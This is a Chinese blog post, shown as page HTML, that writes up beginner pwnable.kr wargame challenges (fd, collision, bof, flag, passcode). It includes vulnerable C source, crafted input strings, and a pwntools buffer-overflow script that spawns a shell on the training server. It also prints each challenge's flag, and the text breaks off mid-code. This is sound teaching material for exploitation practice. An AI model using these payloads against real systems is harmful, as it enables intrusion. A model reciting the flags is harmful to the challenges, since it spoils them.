<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>pwnable.kr - Toddler&#39;s Bottle 部分writeup - Aloxaf&#39;s Blog</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="Aloxaf" /><meta name="description" content="Toddler&amp;rsquo;s Bottle vey
包含了 Toddler&amp;rsquo;s Bottle 这一节的除了 UAF 和 unlink 以外的 writeup. (一看就知道还不会利用堆漏洞)
更: 又多了 blukat 和 horcruses&amp;hellip;&amp;hellip;
" /><meta name="keywords" content="aloxaf, ctf, linux, zsh" />






<meta name="generator" content="Hugo 0.78.1 with theme even" />


<link rel="canonical" href="https://www.aloxaf.com/2018/05/pwnable.kr_toddlers_bottle/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.65ccf00eb040f87c6c85a4206ef3520967b49eb3940b6b6f15c2e84bc94782d7.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="pwnable.kr - Toddler&#39;s Bottle 部分writeup" />
<meta property="og:description" content="Toddler&rsquo;s Bottle vey
包含了 Toddler&rsquo;s Bottle 这一节的除了 UAF 和 unlink 以外的 writeup.
(一看就知道还不会利用堆漏洞)
更: 又多了 blukat 和 horcruses&hellip;&hellip;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.aloxaf.com/2018/05/pwnable.kr_toddlers_bottle/" />
<meta property="article:published_time" content="2018-05-04T10:19:12+00:00" />
<meta property="article:modified_time" content="2018-05-04T10:19:12+00:00" />
<meta itemprop="name" content="pwnable.kr - Toddler&#39;s Bottle 部分writeup">
<meta itemprop="description" content="Toddler&rsquo;s Bottle vey
包含了 Toddler&rsquo;s Bottle 这一节的除了 UAF 和 unlink 以外的 writeup.
(一看就知道还不会利用堆漏洞)
更: 又多了 blukat 和 horcruses&hellip;&hellip;">
<meta itemprop="datePublished" content="2018-05-04T10:19:12+00:00" />
<meta itemprop="dateModified" content="2018-05-04T10:19:12+00:00" />
<meta itemprop="wordCount" content="11516">



<meta itemprop="keywords" content="ctf,writeup,pwn," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="pwnable.kr - Toddler&#39;s Bottle 部分writeup"/>
<meta name="twitter:description" content="Toddler&rsquo;s Bottle vey
包含了 Toddler&rsquo;s Bottle 这一节的除了 UAF 和 unlink 以外的 writeup.
(一看就知道还不会利用堆漏洞)
更: 又多了 blukat 和 horcruses&hellip;&hellip;"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">Aloxaf&#39;s Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">首页</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">归档</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">标签</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">关于</li>
      </a><a href="/friend/">
        <li class="mobile-menu-item">友链</li>
      </a>
  </ul>
</nav>
  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">Aloxaf&#39;s Blog</a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">首页</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">归档</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">标签</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">关于</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/friend/">友链</a>
      </li>
  </ul>
</nav>
    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">pwnable.kr - Toddler&#39;s Bottle 部分writeup</h1>

      <div class="post-meta">
        <span class="post-time"> 2018-05-04 </span>
        <div class="post-category">
            <a href="/categories/writeup/"> writeup </a>
            </div>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#fd">[fd]</a></li>
    <li><a href="#collision">[collision]</a></li>
    <li><a href="#bof">bof</a></li>
    <li><a href="#flag">flag</a></li>
    <li><a href="#passcode">passcode</a></li>
    <li><a href="#random">random</a></li>
    <li><a href="#input">input</a>
      <ul>
        <li><a href="#第一关">第一关</a></li>
        <li><a href="#第二关">第二关</a></li>
        <li><a href="#第三关">第三关</a></li>
        <li><a href="#第四关">第四关</a></li>
        <li><a href="#第五关">第五关</a></li>
        <li><a href="#最终代码">最终代码</a></li>
      </ul>
    </li>
    <li><a href="#leg">leg</a>
      <ul>
        <li><a href="#arm汇编简介">ARM汇编简介</a></li>
        <li><a href="#key1">key1</a></li>
        <li><a href="#key2">key2</a></li>
        <li><a href="#key3">key3</a></li>
      </ul>
    </li>
    <li><a href="#mistake">mistake</a></li>
    <li><a href="#shellshock">shellshock</a></li>
    <li><a href="#coin1">coin1</a></li>
    <li><a href="#blackjack">blackjack</a></li>
    <li><a href="#lotto">lotto</a></li>
    <li><a href="#cmd1">cmd1</a></li>
    <li><a href="#cmd2">cmd2</a>
      <ul>
        <li><a href="#大佬们的解法">大佬们的解法</a></li>
      </ul>
    </li>
    <li><a href="#uaf-todo">uaf (TODO)</a></li>
    <li><a href="#memcpy">memcpy</a></li>
    <li><a href="#asm">asm</a></li>
    <li><a href="#unlink-todo">unlink (TODO)</a></li>
    <li><a href="#blukat-todo">blukat (TODO)</a></li>
    <li><a href="#horcruses-todo">horcruses (TODO)</a></li>
  </ul>
</nav>
  </div>
</div>
  <div class="post-outdated">
    <div class="warn">
      <p>【注】本文最后更新于 <span class="timeago" datetime="2018-05-04T10:19:12" title="May 4, 2018">May 4, 2018</span>，文中内容可能已经过时。</p>
    </div>
  </div>
    <div class="post-content">
      <p>Toddler&rsquo;s Bottle vey</p>
<p>包含了 Toddler&rsquo;s Bottle 这一节的除了 UAF 和 unlink 以外的 writeup.
(一看就知道还不会利用堆漏洞)</p>
<p>更: 又多了 blukat 和 horcruses&hellip;&hellip;</p>
<h1 id="fd">[fd]</h1>
<blockquote>
<p>Mommy! what is a file descriptor in Linux?</p>
<ul>
<li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
<a href="https://youtu.be/971eZhMHQQw">https://youtu.be/971eZhMHQQw</a></li>
</ul>
<p>ssh <a href="mailto:fd@pwnable.kr">fd@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>ls可以看到三个文件, 其中flag文件无法直接读取(好像是废话&hellip;)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">fd@ubuntu:~$ ls
fd  fd.c  flag
fd@ubuntu:~$ cat flag
cat: flag: Permission denied
</code></pre></td></tr></table>
</div>
</div><p>flag.c 内容如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;pass argv[1] a number</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;LETMEWIN</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;good job :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;learn about Linux file IO</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>发现获得flag的要求是传入n, 使得 read 从 n - 0x1234 读取字符串,</p>
<p>再判断该字符串是否与 LETMEWIN 相等</p>
<p>Google 一下获知以下内容</p>
<table>
<thead>
<tr>
<th>value</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>stdin</td>
</tr>
<tr>
<td>1</td>
<td>stdout</td>
</tr>
<tr>
<td>2</td>
<td>stderr</td>
</tr>
</tbody>
</table>
<p>那么 n 应该为 0 + 0x1234 = 4660</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
</code></pre></td></tr></table>
</div>
</div><p>flag 为 <code>mommy! I think I know what a file descriptor is!!</code></p>
<h1 id="collision">[collision]</h1>
<blockquote>
<p>Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!</p>
<p>ssh <a href="mailto:col@pwnable.kr">col@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>col.c内容如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">hashcode</span> <span class="o">=</span> <span class="mh">0x21DD09EC</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">check_password</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">p</span><span class="p">){</span>
    <span class="kt">int</span><span class="o">*</span> <span class="n">ip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">res</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">ip</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;usage : %s [passcode]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">20</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;passcode length should be 20 bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">hashcode</span> <span class="o">==</span> <span class="n">check_password</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)){</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;wrong passcode.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>我们的目标是传入一个字符串 使得 check_password 的校验值为 0x21DD09EC</p>
<p>check_passcode 将传入的 char* 强制转换为 int* 再相加</p>
<p>一开始是想写脚本碰撞, 后来发现这个算法很简单, 完全可以手动构造一个</p>
<p>hashcode = 0x21DD09EC = 0x06C5CEC8*4 + 0x06C5CECC</p>
<p>只需要注意小端序与python版本, py3可能是默认编码是UTF-8的原因
直接使用Python3不好处理</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">col@ubuntu:~$ ./col $(python2 -c &#34;print(&#39;\xc8\xce\xc5\x06&#39;*4+&#39;\xcc\xce\xc5\x06&#39;)&#34;)
daddy! I just managed to create a hash collision :)
</code></pre></td></tr></table>
</div>
</div><p>flag 为 <code>daddy! I just managed to create a hash collision :)</code></p>
<h1 id="bof">bof</h1>
<blockquote>
<p>Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?</p>
<p>Download : <a href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a>
Download : <a href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p>
<p>Running at : nc pwnable.kr 9000</p>
</blockquote>
<p>首先看看 bof.c 内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;overflow me : &#34;</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>   <span class="c1">// smash me!
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nah..</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
    <span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>溢出点是 gets 函数</p>
<p>目标很简单, 一直溢出到 func 参数部分被 0xcafebabe 覆盖即可</p>
<p>看一下二进制文件, 确认是32位</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; checksec --file bof
[*] &#39;/home/zhonghua/writeup/pwnable.kr/bof&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></td></tr></table>
</div>
</div><p>拖进 IDA , 反编译得知要覆盖 0x2c + 0x4 + 0x4 才到参数部分</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-2Ch]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-Ch]
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;overflow me : &#34;</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">889275714</span> <span class="p">)</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Nah..&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>直接用 pwntools 写</p>
<p>在本地是毫无悬念地通过了, 然而远程服务器试了几次才过</p>
<p>比较迷</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
<span class="c1"># -*- coding: utf-8</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwnable.kr&#39;</span><span class="p">,</span> <span class="mi">9000</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x2C</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">),</span> <span class="mh">0xcafebabe</span><span class="p">])</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>flag为 <code>daddy, I just pwned a buFFer :)</code></p>
<h1 id="flag">flag</h1>
<blockquote>
<p>Papa brought me a packed present! let&rsquo;s open it.</p>
<p>Download : <a href="http://pwnable.kr/bin/flag">http://pwnable.kr/bin/flag</a></p>
<p>This is reversing task. all you need is binary</p>
</blockquote>
<p>二进制世家啊这是</p>
<p>file一下flag, 得知是64位ELF</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
</code></pre></td></tr></table>
</div>
</div><p>chmod +x后执行一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; chmod +x flag
&gt; ./flag
I will malloc() and strcpy the flag there. take it.
</code></pre></td></tr></table>
</div>
</div><p>但是这个文件 IDA 打开就只要三个函数, 完全看不懂在干嘛&hellip;</p>
<p>下断点在strcpy处也不行, 似乎是因为strip过的原因</p>
<p>在IDA各个视图间切换的的时候, 突然看到了Hex视图里有upx的字样,
仔细一看这个文件是upx压缩过的</p>
<p>那就没问题了, <code>upx -d</code> 解压文件</p>
<p>再拖入 IDA, 发现flag是以明文存储, 直接复制</p>
<p>得到 flag <code>UPX...? sounds like a delivery service :)</code></p>
<h1 id="passcode">passcode</h1>
<blockquote>
<p>Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?</p>
<p>ssh <a href="mailto:passcode@pwnable.kr">passcode@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>连上去ls一下 flag + 题目名 + 题目名.c 的熟悉配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">passcode1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">passcode2</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter passcode1 : &#34;</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>

    <span class="c1">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
</span><span class="c1"></span>    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter passcode2 : &#34;</span><span class="p">);</span>
